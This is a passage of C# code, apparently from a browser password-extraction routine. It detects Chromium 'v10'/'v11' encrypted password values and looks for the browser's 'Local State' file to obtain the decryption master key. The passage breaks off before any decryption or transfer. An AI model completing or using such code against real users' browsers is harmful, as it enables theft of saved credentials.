            if (password.StartsWith("v10") || password.StartsWith("v11"))
            {
                // Get masterkey location
                string masterKey, masterKeyPath = "";
                foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
                {
                    masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
